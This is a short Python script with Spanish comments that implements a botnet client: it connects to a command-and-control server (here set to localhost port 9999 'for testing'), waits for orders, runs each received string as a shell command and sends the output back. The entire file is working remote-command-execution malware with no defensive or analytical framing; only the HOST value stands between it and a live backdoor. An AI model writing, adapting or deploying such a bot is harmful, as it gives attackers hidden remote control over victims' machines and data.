import socket
import subprocess

# Dirección y puerto del servidor C&C (debe coincidir con el servidor)
HOST = "127.0.0.1"  # IP del servidor C&C (usando localhost para prueba)
PORT = 9999  # Puerto que escucha el servidor C&C

# Función para conectar el bot al servidor C&C
def conectar_a_CnC():
    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot.connect((HOST, PORT))
    print(f"Conectado al servidor C&C {HOST}:{PORT}")
    return bot

# Función para esperar órdenes del servidor C&C
def esperar_ordenes(bot):
    while True:
        # Recibir comandos del servidor C&C
        orden = bot.recv(1024).decode('utf-8', errors='ignore')
        if orden:
            print(f"Comando recibido: {orden}")
            # Ejecutar el comando recibido y capturar la salida
            try:
                resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT)
                bot.send(resultado)
            except subprocess.CalledProcessError as e:
                bot.send(f"Error al ejecutar el comando: {e.output.decode('utf-8', errors='ignore')}".encode('utf-8'))

# Función principal que conecta el bot al servidor C&C y espera órdenes
def ejecutar_bot():
    bot = conectar_a_CnC()
    esperar_ordenes(bot)

if __name__ == "__main__":
    ejecutar_bot()